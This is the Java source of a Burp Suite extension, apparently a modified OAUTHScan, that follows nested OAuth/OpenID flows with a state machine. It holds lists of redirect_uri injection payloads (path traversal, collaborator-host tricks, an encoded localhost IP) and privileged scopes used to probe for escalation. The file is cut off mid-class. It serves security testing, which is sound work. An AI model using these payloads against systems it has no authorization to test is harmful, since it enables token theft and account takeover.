package burp;


/*
# OAUTHScan
#
# OAUTHScan is a Burp Suite Extension written in Java with the aim to provide some automatic security checks,
# which could be useful during penetration testing on applications implementing OAUTHv2 and OpenID standards.
#
# The plugin looks for various OAUTHv2/OpenID vulnerabilities and common misconfigurations (based on
# official specifications of both frameworks).
#
# Copyright (C) 2022 Maurizio Siddu
#
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>
*/


//没有对原本的内容进行变动，只增加了针对嵌套oauth的部分

import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.text.SimpleDateFormat;
import java.time.Instant;
import java.util.TimeZone;
import java.util.Base64;
import java.util.Date;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.Set;






public class BurpExtender implements IBurpExtender, IScannerCheck, IScannerInsertionPointProvider, IExtensionStateListener {
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;

    private static PrintWriter stdout;
    private static PrintWriter stderr;

    public final String PLUGIN_NAME    = "MCPOAUTHScan";
    public final String PLUGIN_VERSION = "1.1";


    // List of system already tested for wellknown urls
    private static List<String> alreadyChecked = new ArrayList<>();

    private Thread collaboratorThread;
    final long NANOSEC_PER_SEC = 1000l*1000*1000;
    private static final int POLLING_INTERVAL = 3000;  // milliseconds

    private static final List<String> IANA_PARAMS = Arrays.asList("client_id", "client_secret", "response_type", "redirect_uri",
            "scope", "state", "code", "error", "error_description", "error_uri", "grant_type", "access_token", "token_type", "expires_in",
            "username", "password", "refresh_token", "nonce", "display", "prompt", "max_age", "ui_locales", "claims_locales", "id_token_hint",
            "login_hint", "acr_values", "claims", "registration", "request", "request_uri", "id_token", "session_state", "assertion",
            "client_assertion", "client_assertion_type", "code_verifier", "code_challenge", "code_challenge_method", "claim_token", "pct",
            "rpt", "ticket", "upgraded", "vtr", "device_code", "resource", "audience", "requested_token_type", "subject_token",
            "subject_token_type", "actor_token", "actor_token_type", "issued_token_type", "response_mode", "nfv_token", "iss", "sub",
            "aud", "exp", "nbf", "iat", "jti", "ace_profile", "nonce1", "nonce2", "ace_client_recipientid", "ace_server_recipientid",
            "req_cnf", "rs_cnf", "cnf");


    private static final List<String> ACR_VALUES = Arrays.asList("face", "ftp", "geo", "hwk", "iris", "kba", "mca", "mfa", "otp",
            "pin", "pwd", "rba", "retina", "sc", "sms", "swk", "tel", "user", "vbm", "wia");


    // 用于记录已经测试过的 DCR 注册端点，防止无限重复发包
    //private static List<String> alreadyTestedDCR = new ArrayList<>();
    private Set<String> alreadyTestedPassiveDCR = java.util.concurrent.ConcurrentHashMap.newKeySet();  // 被动拦截去重
    private Set<String> alreadyTestedActiveDCR = java.util.concurrent.ConcurrentHashMap.newKeySet();   // 主动探测去重

    private static final List<String> INJ_REDIR = new ArrayList<>();
    static {
        //INJ_REDIR.add("/../../../../../notexist");
        INJ_REDIR.add("%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fnotexist");
        INJ_REDIR.add("/..;/..;/..;/../testOauth");
        INJ_REDIR.add("https://burpcollaborator.net/");
        INJ_REDIR.add("@burpcollaborator.net/");
        INJ_REDIR.add("https://burpcollaborator.net#");
        INJ_REDIR.add(":password@burpcollaborator.net");
        INJ_REDIR.add(".burpcollaborator.net/");
        INJ_REDIR.add("https://localhost.burpcollaborator.net/");
        INJ_REDIR.add("&redirect_uri=https://burpcollaborator.net/");
//        INJ_REDIR.add("https://127.0.0.1/");
//        INJ_REDIR.add("http://127.0.0.1/");
//        INJ_REDIR.add("http://localhost/");
        INJ_REDIR.add("http://2130706433");
        INJ_REDIR.add("HOST_HEADER");
        INJ_REDIR.add("/../../../../../notexist&response_mode=fragment"); // payload only for OpenID cases
    }

    private static final List<String> INJ_SCOPE = new ArrayList<>();
    static {
        INJ_SCOPE.add("notexist");
        INJ_SCOPE.add("admin");
        INJ_SCOPE.add("premium");
        INJ_SCOPE.add("profile%20email%20address%20phone");
        INJ_SCOPE.add("write%20read");
        INJ_SCOPE.add("private");
        INJ_SCOPE.add("test");
        INJ_SCOPE.add("email");
        INJ_SCOPE.add("profile");
        INJ_SCOPE.add("offline_access");
        INJ_SCOPE.add("address");
        INJ_SCOPE.add("phone");
        INJ_SCOPE.add("okta.apps.manage");
        INJ_SCOPE.add("okta.apps.read");
        INJ_SCOPE.add("okta.authorizationServers.manage");
        INJ_SCOPE.add("okta.authorizationServers.read");
        INJ_SCOPE.add("okta.clients.manage");
        INJ_SCOPE.add("okta.clients.read");
        INJ_SCOPE.add("okta.clients.register");
        INJ_SCOPE.add("okta.devices.manage");
        INJ_SCOPE.add("okta.devices.read");
        INJ_SCOPE.add("okta.domains.manage");
        INJ_SCOPE.add("okta.domains.read");
        INJ_SCOPE.add("okta.eventHooks.manage");
        INJ_SCOPE.add("okta.eventHooks.read");
        INJ_SCOPE.add("okta.factors.manage");
        INJ_SCOPE.add("okta.factors.read");
        INJ_SCOPE.add("okta.groups.manage");
        INJ_SCOPE.add("okta.groups.read");
        INJ_SCOPE.add("okta.idps.manage");
        INJ_SCOPE.add("okta.idps.read");
        INJ_SCOPE.add("okta.inlineHooks.manage");
        INJ_SCOPE.add("okta.inlineHooks.read");
        INJ_SCOPE.add("okta.linkedObjects.manage");
        INJ_SCOPE.add("okta.linkedObjects.read");
        INJ_SCOPE.add("okta.logs.read");
        INJ_SCOPE.add("okta.policies.read");
        INJ_SCOPE.add("okta.profileMappings.manage");
        INJ_SCOPE.add("okta.profileMappings.read");
        INJ_SCOPE.add("okta.roles.manage");
        INJ_SCOPE.add("okta.roles.read");
        INJ_SCOPE.add("okta.schemas.manage");
        INJ_SCOPE.add("okta.schemas.read");
        INJ_SCOPE.add("okta.sessions.manage");
        INJ_SCOPE.add("okta.sessions.read");
        INJ_SCOPE.add("okta.templates.manage");
        INJ_SCOPE.add("okta.templates.read");
        INJ_SCOPE.add("okta.trustedOrigins.manage");
        INJ_SCOPE.add("okta.trustedOrigins.read");
        INJ_SCOPE.add("okta.users.manage");
        INJ_SCOPE.add("okta.users.read");
        INJ_SCOPE.add("okta.users.manage.self");
        INJ_SCOPE.add("okta.users.read.self");
        INJ_SCOPE.add("okta.userTypes.manage");
        INJ_SCOPE.add("okta.userTypes.read");
        INJ_SCOPE.add("read_repository");
        INJ_SCOPE.add("write_repository");
        INJ_SCOPE.add("sudo");
        INJ_SCOPE.add("api");
        INJ_SCOPE.add("profile:user_id");
        INJ_SCOPE.add("postal_code");
        INJ_SCOPE.add("cdp_query_api");
        INJ_SCOPE.add("pardot_api");
        INJ_SCOPE.add("cdp_profile_api");
        INJ_SCOPE.add("chatter_api");
        INJ_SCOPE.add("cdp_ingest_api");
        INJ_SCOPE.add("eclair_api");
        INJ_SCOPE.add("wave_api");
        INJ_SCOPE.add("custom_permissions");
        INJ_SCOPE.add("lightning");
        INJ_SCOPE.add("content");
        INJ_SCOPE.add("full");
        INJ_SCOPE.add("refresh_token");
        INJ_SCOPE.add("visualforce");
        INJ_SCOPE.add("web");
    }

    private static final List<String> WELL_KNOWN = new ArrayList<>();
    static {
        WELL_KNOWN.add("/.well-known/openid-configuration");
        WELL_KNOWN.add("/.well-known/oauth-authorization-server");
        WELL_KNOWN.add("/.well-known/webfinger");
        WELL_KNOWN.add("/openam/.well-known/webfinger");
        WELL_KNOWN.add("/.well-known/host-meta");
        WELL_KNOWN.add("/.well-known/oidcdiscovery");
        WELL_KNOWN.add("/organizations/v2.0/.well-known/openid-configuration");
        WELL_KNOWN.add("/.well-known/webfinger?resource=ORIGINCHANGEME/anonymous&rel=http://openid.net/specs/connect/1.0/issuer");
        WELL_KNOWN.add("/.well-known/webfinger?resource=acct:USERCHANGEME@URLCHANGEME&rel=http://openid.net/specs/connect/1.0/issuer");
    }

    private Set<String> alreadyReportedStates = new java.util.concurrent.ConcurrentHashMap().newKeySet();

    private List<String> GOTOPENIDTOKENS = new ArrayList<>();
    private Map<String, List<String>> GOTTOKENS = new HashMap<String, List<String>>();
    private Map<String, List<String>> GOTCODES = new HashMap<String, List<String>>();
    private Map<String, List<String>> GOTSTATES = new HashMap<String, List<String>>();
    private Map<String, List<String>> GOTEXPIRATIONS = new HashMap<String, List<String>>();
    private Map<String, List<String>> GOTCLIENTSECRETS = new HashMap<String, List<String>>();

    public enum FlowState {
        INIT,
        L1_AUTH_REQUESTED,     // 1. 发起 L1 网关请求
        L2_AUTH_REQUESTED,     // 2. 发生跨层重定向，进入 L2 IdP 授权
        L2_CALLBACK_RECEIVED,  // 3. IdP 授权完成，携带 L2 Code 回调网关
        L1_CALLBACK_RECEIVED,  // 4. 网关处理完成，携带 L1 Code 回调本地/客户端
        TOKEN_REQUESTED,       // 5. 客户端发起 Token 换取
        COMPLETED,             // 6. 成功获取 Token，闭环
        BROKEN                 // X. 状态异常/校验失败
    }

    public class OAuthFlowContext {
        public boolean isL1L2ConsistencyChecked = false;
        public String flowId;
        public FlowState state = FlowState.INIT;
        public long lastActiveTime;

        // L1 上下文
        public String l1ClientId;
        public String l1State;
        public String l1Code;
        public String l1PkceChallenge;

        // L2 上下文
        public String l2ClientId;
        public String l2State;
        public String l2Code;
        public String l2PkceChallenge;

        public IHttpRequestResponse l1AuthReq;
        public IHttpRequestResponse l2AuthReq;
        public IHttpRequestResponse l2CallbackReq;
        public IHttpRequestResponse l1CallbackReq;
        public IHttpRequestResponse tokenReq;

        public OAuthFlowContext(String flowId) {
            this.flowId = flowId;
            this.lastActiveTime = System.currentTimeMillis();
        }
    }

    // 实例化全局流引擎
    private ProtocolFlowEngine flowEngine = new ProtocolFlowEngine();

    public class ProtocolFlowEngine {
        // 用 State 作为寻址主键
        // 因为 Callback 阶段只有 state 和 code
        public Map<String, OAuthFlowContext> activeFlowsByState = new java.util.concurrent.ConcurrentHashMap<>();
        public List<IHttpRequestResponse> statelessRequests = new java.util.concurrent.CopyOnWriteArrayList<>();
        public Map<String, IHttpRequestResponse> orphanTokenRequests = new java.util.concurrent.ConcurrentHashMap<>();

        // 辅助提取 state 或 nonce 作为唯一锚点
        private String extractStateAnchor(IExtensionHelpers helpers, IHttpRequestResponse reqResp) {
            IRequestInfo reqInfo = helpers.analyzeRequest(reqResp);
            for (IParameter param : reqInfo.getParameters()) {
                String pName = param.getName().toLowerCase();
                if (pName.equals("state") || pName.equals("nonce") || pName.equals("ctx") || pName.equals("relay_state")) {
                    return param.getValue();
                }
            }
            return null;
        }

        // 被动阶段核心处理：基于严格嵌套有限状态机 (Nested FSM) 推进协议流
        public void processPassiveTraffic(IExtensionHelpers helpers, IHttpRequestResponse reqResp) {
            IRequestInfo reqInfo = helpers.analyzeRequest(reqResp);

            String rawStateVal = extractStateAnchor(helpers, reqResp);

            String reqBodyStr = null;
            byte[] requestBytes = reqResp.getRequest();
            int reqBodyOffset = reqInfo.getBodyOffset();
            if (requestBytes.length > reqBodyOffset) {
                reqBodyStr = helpers.bytesToString(requestBytes).substring(reqBodyOffset).trim();
            }
            if (rawStateVal == null && reqInfo.getMethod().equals("POST") && reqBodyStr != null ) {
            //if (rawStateVal == null && reqInfo.getMethod().equals("POST") && reqBodyStr != null && reqBodyStr.startsWith("{")) {
                Matcher mJsonState = Pattern.compile("(?i)\"state\"\\s*:\\s*\"([^\"]+)\"").matcher(reqBodyStr);
                if (mJsonState.find()) {
                    rawStateVal = mJsonState.group(1);
                    stdout.println("[FSM DEBUG] Extracted state from JSON POST body.");
                }
            }

            String currentStateVal = rawStateVal != null ? helpers.urlDecode(rawStateVal) : null;
            OAuthFlowContext flow = null;

            if (currentStateVal != null) {
                flow = activeFlowsByState.get(currentStateVal);
            }

            if (flow == null && currentStateVal != null && (currentStateVal.contains(".") || currentStateVal.startsWith("eyJ"))) {
                try {
                    String b64 = currentStateVal.contains(".") ? currentStateVal.split("\\.")[1] : currentStateVal;
                    while (b64.length() % 4 != 0) b64 += "=";
                    b64 = b64.replace('-', '+').replace('_', '/');

                    String decodedJson = new String(java.util.Base64.getDecoder().decode(b64), "UTF-8");

                    Matcher innerStateMatcher = Pattern.compile("(?i)\"state\"\\s*:\\s*\"([^\"]+)\"").matcher(decodedJson);
                    if (innerStateMatcher.find()) {
                        String innerState = innerStateMatcher.group(1);

                        // JSON 里的字符串是明文，如果强行 urlDecode 会把 Base64 里的 '+' 变成空格！
                        // 只有在极个别嵌套了 URL 编码的情况下（包含 %），才去解码。
                        if (innerState.contains("%")) {
                            innerState = helpers.urlDecode(innerState);
                        }

                        flow = activeFlowsByState.get(innerState);
                        if (flow != null) {
                            activeFlowsByState.put(currentStateVal, flow);
                            flow.l2State = currentStateVal;
                            if (flow.state == FlowState.L1_AUTH_REQUESTED) {
                                flow.state = FlowState.L2_AUTH_REQUESTED;
                            }
                            stdout.println("[FSM] Flow [" + flow.flowId + "]  Base64 Late Binding Successful! Cracked inner state.");
                        }
                    }
                } catch (Exception e) {}
            }
            if (flow == null && reqResp.getResponse() != null) {
                IResponseInfo tempRespInfo = helpers.analyzeResponse(reqResp.getResponse());
                if (tempRespInfo.getStatusCode() >= 300 && tempRespInfo.getStatusCode() < 400) {
                    String tempLoc = getHttpHeaderValueFromList(tempRespInfo.getHeaders(), "Location");
                    if (tempLoc != null && tempLoc.contains("state=")) {
                        Matcher mState = Pattern.compile("[?&]state=([^&]+)").matcher(tempLoc);
                        if (mState.find()) {
                            String recoveredState = helpers.urlDecode(mState.group(1));
                            flow = activeFlowsByState.get(recoveredState);
                            if (flow != null) {
                                currentStateVal = recoveredState;
                                stdout.println("[FSM DEBUG] Flow [" + flow.flowId + "] recovered from 302 Location header!");
                            }
                        }
                    }
                }
            }


            if (flow == null && reqInfo.getMethod().equals("POST") && reqInfo.getUrl().getPath().contains("token")) {
                String reqCode = null;

                IParameter codeParam = helpers.getRequestParameter(reqResp.getRequest(), "code");
                if (codeParam == null) codeParam = helpers.getRequestParameter(reqResp.getRequest(), "authCode");

                if (codeParam != null && codeParam.getValue() != null) {
                    reqCode = helpers.urlDecode(codeParam.getValue());
                } else if (reqBodyStr != null) {
                    Matcher bodyCodeMatcher = Pattern.compile("(?i)(?:code|authCode)=([^&\\s]+)").matcher(reqBodyStr);
                    if (bodyCodeMatcher.find()) {
                        reqCode = helpers.urlDecode(bodyCodeMatcher.group(1));
                    }
                }

                if (reqCode != null) {
                    for (OAuthFlowContext f : activeFlowsByState.values()) {
                        if (reqCode.equals(f.l1Code) || reqCode.equals(f.l2Code)) {
                            flow = f;
                            break;
                        }
                    }

                    // [新增] 找不到归属的流，进入迟绑定缓冲区暂存，直接返回
                    if (flow == null) {
                        orphanTokenRequests.put(reqCode, reqResp);
                        stdout.println("[FSM DEBUG] Orphan Token Request buffered for code: [" + reqCode + "]. Waiting for Callback.");
                        return;
                    }
                } else {
                    stdout.println("[FSM DEBUG] Token fallback FAILED! Could not extract 'code' parameter.");
                }
            }


            boolean isAuthStartPoint = false;
            String pathLower = reqInfo.getUrl().getPath().toLowerCase();
            IParameter resTypeParam = helpers.getRequestParameter(reqResp.getRequest(), "response_type");
            if (resTypeParam != null) {
                isAuthStartPoint = true; // 完美适配 Google 的 /auth，以及所有标准 OAuth
            }
            else if (reqInfo.getMethod().equals("POST") && reqBodyStr != null && (reqBodyStr.contains("\"response_type\"")||(reqBodyStr.contains("\"client_id\"") && reqBodyStr.contains("\"redirect_uri\"")))) {
                isAuthStartPoint = true;
            }

            if (flow == null && !isAuthStartPoint && !pathLower.contains("token")) {
                if (pathLower.contains("authorize") || pathLower.contains("login")) {
                    statelessRequests.add(reqResp);
                }
                return;
            }

            IResponseInfo respInfo = reqResp.getResponse() != null ? helpers.analyzeResponse(reqResp.getResponse()) : null;

            // [状态 1：创建起点]
            if (flow == null && currentStateVal != null && isAuthStartPoint) {

                IParameter redirectUriParam = helpers.getRequestParameter(reqResp.getRequest(), "redirect_uri");
                if (redirectUriParam != null) {
                    String reqRedirectUri = helpers.urlDecode(redirectUriParam.getValue());

                    for (OAuthFlowContext activeFlow : activeFlowsByState.values()) {
                        // 遍历当前存活的流
                        if (activeFlow.state == FlowState.L1_AUTH_REQUESTED || activeFlow.state == FlowState.L2_AUTH_REQUESTED) {
                            String knownL1Host = activeFlow.l1AuthReq.getHttpService().getHost();

                            // 如果这个新请求的 redirect_uri 包含了我们已知的 L1 域名 (例如 mcp.atomic.bi)
                            if (reqRedirectUri.contains(knownL1Host)) {
                                flow = activeFlow;

                                // 将这个新的 state (Google 的 state) 作为 L2 State 绑定到字典中
                                activeFlowsByState.put(currentStateVal, flow);
                                flow.l2State = currentStateVal;
                                flow.l2AuthReq = reqResp;

                                IParameter l2Pkce = helpers.getRequestParameter(reqResp.getRequest(), "code_challenge");
                                if (l2Pkce != null) flow.l2PkceChallenge = l2Pkce.getValue();
                                IParameter l2Cid = helpers.getRequestParameter(reqResp.getRequest(), "client_id");
                                if (l2Cid != null) flow.l2ClientId = l2Cid.getValue();

                                if (flow.state == FlowState.L1_AUTH_REQUESTED) {
                                    flow.state = FlowState.L2_AUTH_REQUESTED;
                                }
                                stdout.println("[FSM] Flow [" + flow.flowId + "]  Heuristic Layer 2 Discovery (Redirect Match) -> L2_AUTH_REQUESTED");
                                break; // 匹配成功，跳出循环
                            }
                        }
                    }
                }

                if (flow == null) {
                    flow = new OAuthFlowContext(currentStateVal);
                    flow.l1State = currentStateVal;
                    flow.l1AuthReq = reqResp;

                    IParameter cIdParam = helpers.getRequestParameter(reqResp.getRequest(), "client_id");
                    if (cIdParam != null) flow.l1ClientId = cIdParam.getValue();

                    IParameter pkceParam = helpers.getRequestParameter(reqResp.getRequest(), "code_challenge");
                    if (pkceParam != null) flow.l1PkceChallenge = pkceParam.getValue();

                    if (reqBodyStr != null && reqBodyStr.startsWith("{")) {
                        if (flow.l1ClientId == null) {
                            Matcher mCid = Pattern.compile("(?i)\"client_id\"\\s*:\\s*\"([^\"]+)\"").matcher(reqBodyStr);
                            if (mCid.find()) flow.l1ClientId = mCid.group(1);
                        }
                        if (flow.l1PkceChallenge == null) {
                            Matcher mPkce = Pattern.compile("(?i)\"code_challenge\"\\s*:\\s*\"([^\"]+)\"").matcher(reqBodyStr);
                            if (mPkce.find()) flow.l1PkceChallenge = mPkce.group(1);
                        }
                    }

                    activeFlowsByState.put(currentStateVal, flow);
                    flow.state = FlowState.L1_AUTH_REQUESTED;

                    if (reqInfo.getMethod().equals("POST")) {
                        stdout.println("[FSM] Flow [" + flow.flowId + "] Started -> L1_AUTH_REQUESTED (API-Driven SPA Auth)");
                    } else {
                        stdout.println("[FSM] Flow [" + flow.flowId + "] Started -> L1_AUTH_REQUESTED");
                    }
                }
            }

            if (flow == null) return;
            flow.lastActiveTime = System.currentTimeMillis();

            boolean isRedirect = (respInfo != null && respInfo.getStatusCode() >= 300 && respInfo.getStatusCode() < 400);
            String location = isRedirect ? getHttpHeaderValueFromList(respInfo.getHeaders(), "Location") : null;


            if (!isRedirect && respInfo != null && respInfo.getStatusCode() >= 200 && respInfo.getStatusCode() < 300) {
                byte[] responseBytes = reqResp.getResponse();
                int respBodyOffset = respInfo.getBodyOffset();
                if (responseBytes.length > respBodyOffset) {
                    String respBodyStr = helpers.bytesToString(responseBytes).substring(respBodyOffset).trim();
                    // 降低匹配门槛：只要 JSON 里包含 url 相关的字眼即可进入正则匹配
                    if (respBodyStr.startsWith("{") && respBodyStr.toLowerCase().contains("url")) {
                        // 正则兼容 "url"、"redirect_url"、"redirecturl"、"redirectUri" 等常见前端路由键名
                        Matcher mUrl = Pattern.compile("(?i)\"(?:redirect_?url|redirectUri|url)\"\\s*:\\s*\"([^\"]+)\"").matcher(respBodyStr);
                        if (mUrl.find()) {
                            String potentialUrl = mUrl.group(1);
                            if (potentialUrl.contains("code=") || potentialUrl.contains("authCode=")) {
                                location = potentialUrl;
                                isRedirect = true; // 欺骗状态机，将其视为标准的 302 跳转
                                stdout.println("[FSM DEBUG] Virtual Redirect Detected! Converted API JSON response to Location.");
                            }
                        }
                    }
                }
            }

            switch (flow.state) {
                case L1_AUTH_REQUESTED:
                    if (isRedirect && location != null) {
                        if (location.contains("client_id=") && location.contains("response_type=")) {
                            Matcher mState = Pattern.compile("state=([^&]+)").matcher(location);
                            if (mState.find()) {
                                String l2State = helpers.urlDecode(mState.group(1));
                                flow.l2State = l2State;
                                activeFlowsByState.put(l2State, flow);
                                flow.state = FlowState.L2_AUTH_REQUESTED;

                                Matcher mPkce = Pattern.compile("code_challenge=([^&]+)").matcher(location);
                                if (mPkce.find()) flow.l2PkceChallenge = helpers.urlDecode(mPkce.group(1));

                                stdout.println("[FSM] Flow [" + flow.flowId + "] Spawns Layer 2 -> L2_AUTH_REQUESTED");
                            }
                        } else if (location.contains("code=") || location.contains("authCode=")) {
                            Matcher mCode = Pattern.compile("(?:code|authCode)=([^&]+)").matcher(location);
                            if (mCode.find()) flow.l1Code = helpers.urlDecode(mCode.group(1));
                            flow.l1CallbackReq = reqResp;
                            flow.state = FlowState.L1_CALLBACK_RECEIVED;
                            stdout.println("[FSM]  Flow [" + flow.flowId + "] Single-Layer Callback -> L1_CALLBACK_RECEIVED");
                        }
                    }
                    break;

                case L2_AUTH_REQUESTED:
                    if (isRedirect && location != null && (location.contains("code=") || location.contains("authCode="))) {
                        boolean isCompactHop = location.contains("127.0.0.1") || location.contains("localhost")
                                || location.contains("vscode") || location.contains("cursor");

                        if (isCompactHop) {
                            flow.l2CallbackReq = reqResp;
                            Matcher mCodeL1 = Pattern.compile("(?:code|authCode)=([^&]+)").matcher(location);
                            if (mCodeL1.find()) {
                                flow.l1Code = helpers.urlDecode(mCodeL1.group(1));
                                stdout.println("[FSM DEBUG] Extracted L1 Code (Compact Hop): [" + flow.l1Code + "]");
                            }

                            IParameter l2CodeParam = helpers.getRequestParameter(reqResp.getRequest(), "code");
                            if (l2CodeParam != null) {
                                flow.l2Code = helpers.urlDecode(l2CodeParam.getValue());
                            }

                            flow.l1CallbackReq = reqResp;
                            flow.state = FlowState.L1_CALLBACK_RECEIVED;
                            stdout.println("[FSM]  Flow [" + flow.flowId + "] Compact Hop Callback -> L1_CALLBACK_RECEIVED");
                        } else {
                            flow.l2AuthReq = reqResp;
                            Matcher mCodeL2 = Pattern.compile("(?:code|authCode)=([^&]+)").matcher(location);
                            if (mCodeL2.find()) {
                                flow.l2Code = helpers.urlDecode(mCodeL2.group(1));
                            }
                            flow.state = FlowState.L2_CALLBACK_RECEIVED;
                            stdout.println("[FSM]  Flow [" + flow.flowId + "] IdP Callback -> L2_CALLBACK_RECEIVED");
                        }
                    }
                    break;

                case L2_CALLBACK_RECEIVED:
                    if (isRedirect && location != null && (location.contains("code=") || location.contains("authCode="))) {

                        String gatewayHost = flow.l1AuthReq.getHttpService().getHost();
                        if (!reqResp.getHttpService().getHost().equals(gatewayHost)) {
                            stdout.println("[FSM DEBUG] Ignored fake Gateway packet! Host [" + reqResp.getHttpService().getHost() + "] is not Gateway [" + gatewayHost + "]");
                            break;
                        }

                        Matcher mCode = Pattern.compile("(?:code|authCode)=([^&]+)").matcher(location);
                        if (mCode.find()) {
                            flow.l1Code = helpers.urlDecode(mCode.group(1));
                            stdout.println("[FSM DEBUG] Extracted L1 Code (Gateway Callback): [" + flow.l1Code + "]");

                            flow.l2CallbackReq = reqResp;
                            flow.l1CallbackReq = reqResp;
                            flow.state = FlowState.L1_CALLBACK_RECEIVED;
                            stdout.println("[FSM]  Flow [" + flow.flowId + "] Gateway Callback -> L1_CALLBACK_RECEIVED");
                        }
                    }
                    break;

                case L1_CALLBACK_RECEIVED:
                    if (reqInfo.getMethod().equals("POST") && reqInfo.getUrl().getPath().contains("token")) {
                        String codeVal = null;
                        IParameter codeParam = helpers.getRequestParameter(reqResp.getRequest(), "code");
                        if (codeParam == null) codeParam = helpers.getRequestParameter(reqResp.getRequest(), "authCode");

                        if (codeParam != null && codeParam.getValue() != null) {
                            codeVal = helpers.urlDecode(codeParam.getValue());
                        } else if (reqBodyStr != null) {
                            Matcher bodyCodeMatcher = Pattern.compile("(?i)(?:code|authCode)=([^&\\s]+)").matcher(reqBodyStr);
                            if (bodyCodeMatcher.find()) codeVal = helpers.urlDecode(bodyCodeMatcher.group(1));
                        }

                        if (codeVal != null) {
                            if (codeVal.equals(flow.l1Code)) {
                                flow.tokenReq = reqResp;
                                flow.state = FlowState.TOKEN_REQUESTED;
                                stdout.println("[FSM] Flow [" + flow.flowId + "] -> TOKEN_REQUESTED");

                                if (respInfo != null && respInfo.getStatusCode() == 200) {
                                    byte[] responseBytes = reqResp.getResponse();
                                    int respBodyOffset = respInfo.getBodyOffset();
                                    if (responseBytes.length > respBodyOffset) {
                                        String respBody = helpers.bytesToString(responseBytes).substring(respBodyOffset).toLowerCase();
                                        if (respBody.contains("\"access_token\"") || respBody.contains("\"id_token\"")) {
                                            flow.state = FlowState.COMPLETED;
                                            stdout.println("[FSM] Flow [" + flow.flowId + "] -> COMPLETED. Perfect Closure!");
                                        }
                                    }
                                }
                            } else {
                                flow.state = FlowState.BROKEN;
                                stdout.println("[FSM WARN] Flow " + flow.flowId + " BROKEN due to Code Mismatch! Expected: [" + flow.l1Code + "] Got: [" + codeVal + "]");
                            }
                        }
                    }
                    break;

                case TOKEN_REQUESTED:
                    if (respInfo != null && respInfo.getStatusCode() == 200) {
                        byte[] responseBytes = reqResp.getResponse();
                        int respBodyOffset = respInfo.getBodyOffset();
                        if (responseBytes.length > respBodyOffset) {
                            String respBody = helpers.bytesToString(responseBytes).substring(respBodyOffset).toLowerCase();
                            if (respBody.contains("\"access_token\"") || respBody.contains("\"id_token\"")) {
                                flow.state = FlowState.COMPLETED;
                                stdout.println("[FSM] Flow [" + flow.flowId + "] -> COMPLETED. Perfect Closure!");
                            }
                        }
                    }
                    break;

                case COMPLETED:
                case BROKEN:
                    break;
            }

            if ((flow.state == FlowState.L1_CALLBACK_RECEIVED || flow.state == FlowState.L2_CALLBACK_RECEIVED) && flow.l1Code != null) {
                if (orphanTokenRequests.containsKey(flow.l1Code)) {
                    IHttpRequestResponse orphanTokenReq = orphanTokenRequests.remove(flow.l1Code);

                    // 补全断裂的链路
                    flow.tokenReq = orphanTokenReq;
                    flow.state = FlowState.TOKEN_REQUESTED;
                    stdout.println("[FSM]  Late Binding Success! Orphan Token Request matched to Flow [" + flow.flowId + "]");

                    // 立即对 Token 请求的响应进行求值，判断是否闭环
                    IResponseInfo tokenRespInfo = orphanTokenReq.getResponse() != null ? helpers.analyzeResponse(orphanTokenReq.getResponse()) : null;
                    if (tokenRespInfo != null && tokenRespInfo.getStatusCode() == 200) {
                        byte[] responseBytes = orphanTokenReq.getResponse();
                        int respBodyOffset = tokenRespInfo.getBodyOffset();
                        if (responseBytes.length > respBodyOffset) {
                            String respBody = helpers.bytesToString(responseBytes).substring(respBodyOffset).toLowerCase();
                            if (respBody.contains("\"access_token\"") || respBody.contains("\"id_token\"")) {
                                flow.state = FlowState.COMPLETED;
                                stdout.println("[FSM] Flow [" + flow.flowId + "] -> COMPLETED. (Perfect Closure via Late Binding)");
                            }
                        }
                    }
                }
            }
        }

        // 辅助方法：寻找另一个 Token 阶段的有效流 (用于跨会话攻击)
        public OAuthFlowContext getAnotherValidFlow(OAuthFlowContext currentFlow) {
            for (OAuthFlowContext f : activeFlowsByState.values()) {
                if (!f.flowId.equals(currentFlow.flowId) && f.state == FlowState.TOKEN_REQUESTED && f.l1Code != null) {
                    return f;
                }
            }
            return null;
        }
    }

    private static final List<String> SECRETTOKENS = new ArrayList<>();
    static {
        SECRETTOKENS.add("Access_Token");
        SECRETTOKENS.add("Access-Token");
        SECRETTOKENS.add("AccessToken");
        SECRETTOKENS.add("Refresh_Token");
        SECRETTOKENS.add("Refresh-Token");
        SECRETTOKENS.add("RefreshToken");
        SECRETTOKENS.add("Secret_Token");
        SECRETTOKENS.add("Secret-Token");
        SECRETTOKENS.add("SecretToken");
        SECRETTOKENS.add("Token");
        SECRETTOKENS.add("SSO_Auth");
        SECRETTOKENS.add("SSO-Auth");
        SECRETTOKENS.add("SSOAuth");
    }

    private static final List<String> SECRETCODES = new ArrayList<>();
    static {
        SECRETCODES.add("Code");
        SECRETCODES.add("AuthCode");
        SECRETCODES.add("Auth_Code");
        SECRETCODES.add("Auth-Code");
        SECRETCODES.add("AuthenticationCode");
        SECRETCODES.add("Authentication_Code");
        SECRETCODES.add("Authentication-Code");
        SECRETCODES.add("oauth_token");
        SECRETCODES.add("oauth-token");
        SECRETCODES.add("oauthtoken");
    }

    private static final List<String> OPENIDTOKENS = new ArrayList<>();
    static {
        OPENIDTOKENS.add("Id_Token");
        OPENIDTOKENS.add("Id-Token");
        OPENIDTOKENS.add("IdToken");
    }

    private static final List<String> EXPIRATIONS = new ArrayList<>();
    static {
        EXPIRATIONS.add("Expires_In");
        EXPIRATIONS.add("Expires-In");
        EXPIRATIONS.add("ExpiresIn");

        EXPIRATIONS.add("Expires");
        EXPIRATIONS.add("Expiration");
    }

    private static final List<String> CLIENTSECRETS = new ArrayList<>();
    static {
        CLIENTSECRETS.add("client_secret");
    }


    private static Set<String> knownGateways = java.util.concurrent.ConcurrentHashMap.newKeySet();

    // 新增：用于记录已经打印过的拓扑信息，防止控制台日志刷屏冗余
